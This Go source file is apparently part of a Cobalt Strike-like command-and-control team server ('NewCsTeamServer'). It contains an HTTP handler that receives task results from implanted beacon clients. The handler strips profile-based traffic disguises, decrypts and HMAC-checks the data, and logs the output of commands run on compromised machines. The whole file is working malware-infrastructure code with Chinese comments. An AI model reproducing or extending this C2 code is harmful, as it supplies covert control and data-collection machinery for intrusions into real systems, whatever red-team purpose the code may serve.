package http

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/config"
	"NewCsTeamServer/crypt"
	"NewCsTeamServer/profile"
	"NewCsTeamServer/server/public"
	"NewCsTeamServer/task"
	"bytes"
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"strconv"
	"strings"
)

// HandleBeaconResult 处理客户端的任务结果
func HandleBeaconResult(c *gin.Context) {
	if len(profile.ProfileConfig.HttpPost.ServerHeader) > 0 {
		for _, header := range profile.ProfileConfig.HttpPost.ServerHeader {
			c.Header(header.Name, header.Value)
		}
	}
	var clientIDStr string

	switch profile.ProfileConfig.HttpPost.IdType { //判断条件好像有点多
	case "header":
		clientIDStr = c.GetHeader(profile.ProfileConfig.HttpPost.IdTypeValue) //从指定header头中获取数据
	case "parameter":
		clientIDStr = c.Query(profile.ProfileConfig.HttpPost.IdTypeValue)
	}
	clientIDStr = strings.Replace(clientIDStr, profile.ProfileConfig.HttpPost.IdAppend, "", 1) // 过滤迷惑数据
	clientIDStr = strings.Replace(clientIDStr, profile.ProfileConfig.HttpPost.IdPrepend, "", 1)
	if clientIDStr == "" {
		c.String(http.StatusBadRequest, "缺少 client_id 参数")
		return
	}
	fmt.Println("clientIDStr:", clientIDStr)
	fmt.Println("clientIDStr加密方式:", profile.ProfileConfig.HttpPost.IdCrypt)
	decodeclientId, err := public.DecryptMultipleTypes([]byte(clientIDStr), profile.ProfileConfig.HttpPost.IdCrypt)
	if err != nil {
		return
	}
	fmt.Println("解密后的client_id:", string(decodeclientId))
	clientID, err := strconv.ParseUint(string(decodeclientId), 10, 32)
	if err != nil {
		c.String(http.StatusBadRequest, "无效的 client_id: %v", err)
		return
	}

	// 检查 ClientID 是否存在
	client, exists := client.GlobalClientManager.GetClient(uint32(clientID))
	if !exists {
		log.Printf("处理结果失败: 未找到客户端 %d", clientID)
		c.String(http.StatusNotFound, "未找到客户端 %d", clientID)
		return
	}
	var body []byte
	fmt.Println("bodyType:", profile.ProfileConfig.HttpPost.ClientOutputType)
	switch profile.ProfileConfig.HttpPost.ClientOutputType {
	case "print": //直接输出在body中
		body, _ = c.GetRawData()
	case "header":
		body = []byte(c.GetHeader(profile.ProfileConfig.HttpPost.ClientOutputTypeValue))
	case "parameter":
		body = []byte(c.Query(profile.ProfileConfig.HttpPost.ClientOutputTypeValue))
	}

	body = bytes.TrimPrefix(body, []byte(profile.ProfileConfig.HttpPost.ClientOutputPrepend))
	body = bytes.TrimSuffix(body, []byte(profile.ProfileConfig.HttpPost.ClientOutputAppend))
	body, err = public.DecryptMultipleTypes(body, profile.ProfileConfig.HttpPost.ClientOutputCrypt) //解密
	if err != nil {
		c.String(http.StatusNotFound, "解密失败 %d", clientID)
		return
	}
	// 验证 SendLength
	if len(body) < 4+crypt.HmacHashLen {
		c.String(http.StatusBadRequest, "无效请求体: 太短 (%d 字节)", len(body))
		return
	}

	// 分离加密数据和 HMAC
	encryptedData := body[4 : len(body)-crypt.HmacHashLen]
	receivedHMAC := body[len(body)-crypt.HmacHashLen:]
	log.Printf("handleBeaconResult: 客户端 %d, 加密数据=%x, 收到 HMAC=%x", clientID, encryptedData, receivedHMAC)

	// 验证 HMAC
	expectedHMAC := crypt.HmacHash(encryptedData, client.HMACKey)
	if !bytes.Equal(receivedHMAC, expectedHMAC) {
		log.Printf("HMAC 验证失败，客户端 %d", clientID)
		c.String(http.StatusUnauthorized, "无效 HMAC 签名")
		return
	}

	// 解密数据（补充 IV 前缀）
	iv := config.Iv
	decryptedData, err := crypt.AesCBCDecrypt(append(iv, encryptedData...), client.AESKey)
	if err != nil {
		log.Printf("解密失败，客户端 %d: %v", clientID, err)
		c.String(http.StatusInternalServerError, "解密失败: %v", err)
		return
	}
	log.Printf("handleBeaconResult: 客户端 %d, 解密数据=%x", clientID, decryptedData)

	// 解析任务结果
	result, err := task.ParseTaskResult(decryptedData)
	if err != nil {
		c.String(http.StatusBadRequest, "解析任务结果失败: %v", err)
		return
	}

	// 存储结果
	//cm.AddResult(uint32(clientID), result)
	log.Printf("收到客户端 %d 的结果: TaskID=%s, Output=%s", clientID, result.TaskID, string(result.Output))

	// 返回成功响应
	// 返回成功响应
	retbody := append([]byte(profile.ProfileConfig.HttpGet.OutPutPrepend), []byte(profile.ProfileConfig.HttpGet.OutPutAppend)...)
	c.Data(200, "application/octet-stream", retbody)
	return
}
